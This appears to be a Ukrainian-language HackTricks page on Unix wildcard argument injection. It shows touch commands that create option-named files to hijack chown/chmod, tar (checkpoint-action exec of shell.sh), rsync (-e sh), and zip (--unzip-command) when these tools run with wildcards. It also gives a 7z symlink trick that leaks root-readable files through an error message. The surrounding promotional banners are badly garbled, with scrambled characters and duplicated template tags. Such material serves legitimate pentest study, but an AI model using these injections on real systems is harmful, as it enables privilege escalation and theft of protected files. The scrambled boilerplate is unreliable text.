{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}


## chown, chmod

Ви можете **вказати, якого власника файлу та дозволи ви хочете скопіювати для решти файлів**
```bash
touch "--reference=/my/own/path/filename"
```
Ви можете використати це, використовуючи [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(комбінована атака)_\
Більше інформації в [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Виконати довільні команди:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Ви можете використати це, використовуючи [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(атака tar)_\
Більше інформації в [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Виконати довільні команди:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
Ви можете експлуатувати це, використовуючи [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(_атака _rsync)_\
Більше інформації в [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

У **7z** навіть використовуючи `--` перед `*` (зауважте, що `--` означає, що наступний ввід не може бути розглянутий як параметри, тому в цьому випадку лише шляхи до файлів) ви можете викликати довільну помилку для читання файлу, тому якщо команда, подібна до наступної, виконується root:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
І ви можете створювати файли в папці, де це виконується, ви можете створити файл `@root.txt` і файл `root.txt`, який є **symlink** на файл, який ви хочете прочитати:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
Тоді, коли **7z** виконується, він буде розглядати `root.txt` як файл, що містить список файлів, які він повинен стиснути (саме це вказує на наявність `@root.txt`), і коли 7z читає `root.txt`, він прочитає `/file/you/want/to/read`, і **оскільки вміст цього файлу не є списком файлів, він видасть помилку**, показуючи вміст.

_Більше інформації в Write-ups коробки CTF від HackTheBox._

## Zip

**Виконати довільні команди:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
```markdown
{% hnt stye="acceas" %}
AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)

<dtil>

<ummr>SupportHackTricks</smmay>

*Перевірте [**підписку на github.com/sorsarlosp!**
* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!haktick\_ive\
* **Приєднуйтесь 💬 [**групі Discord**](https://discord.gg/hRep4RUj7f) або [**групі Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
```
